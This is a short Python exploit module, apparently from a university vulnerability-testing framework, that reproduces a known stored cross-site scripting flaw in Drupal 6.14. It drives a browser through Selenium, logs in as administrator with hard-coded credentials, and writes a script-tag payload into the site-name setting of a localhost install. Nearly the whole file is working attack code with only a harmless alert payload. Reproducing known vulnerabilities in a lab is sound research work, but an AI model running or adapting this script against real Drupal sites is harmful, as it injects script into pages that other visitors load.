import sys
import time
import selenium.common.exceptions
import framework

# POC: http://www.exploit-db.com/exploits/18791/

class Exploit (framework.Exploit):

    attributes = {'Name' :        "DRUPAL_DP0001",
                  'Description' : "Drupal 5.20 and 6.14 (Core) XSS Vulnerabilities",
                  'References' :  [],
                  'Target' :      "Drupal 6.14",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/Drupal_6.14",
                  'Type' : 'XSS'
                  }

    def __init__(self):
        framework.Exploit.__init__(self)
        return
            
    def exploit(self):
        payload = "</title><script>alert(\'xss\');</script>"

        driver = self.create_selenium_driver()
        driver.get("http://localhost/drupal/")
        print "Page opened successfully: ", driver.title


        driver.find_element_by_id("edit-name").send_keys("drupaladmin")
        driver.find_element_by_id("edit-pass").send_keys("drupaladminpw21")
        driver.find_element_by_id("edit-submit").click()

        print "Changing site name..." 
        driver.get("http://localhost/drupal/?q=admin/settings/site-information")
        print "Opened: ", driver.title

        driver.find_element_by_id("edit-site-name").clear()
        driver.find_element_by_id("edit-site-name").send_keys(payload)
        driver.find_element_by_id("edit-submit").click()
        print "Payload sent"
        print "visit http://localhost/drupal/ to see XSS"

        driver.cleanup()
        return

